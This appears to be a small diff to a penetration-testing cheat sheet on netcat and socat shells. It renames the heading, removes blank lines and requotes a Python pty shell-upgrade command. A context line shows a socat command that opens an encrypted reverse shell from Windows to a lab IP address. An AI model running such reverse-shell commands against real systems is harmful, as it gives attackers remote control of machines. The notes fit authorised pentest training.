@@ -1,4 +1,4 @@
-# Shells
+# Shells - Netcat and Socat
 
 ## Windows Netcat Bind shells
 
@@ -40,13 +40,9 @@ Encrypted Reverse shell connection from Windows
 socat OPENSSL:192.168.119.128:443,verify=0 EXEC:cmd.exe,pipes
 ```
 
-
-
 ## Upgrading shells
 
 ````bash
-python -c 'import pty; pty.spawn("/bin/bash")'
+python -c "import pty;pty.spawn('/bin/bash')"
 ````
-
-
 
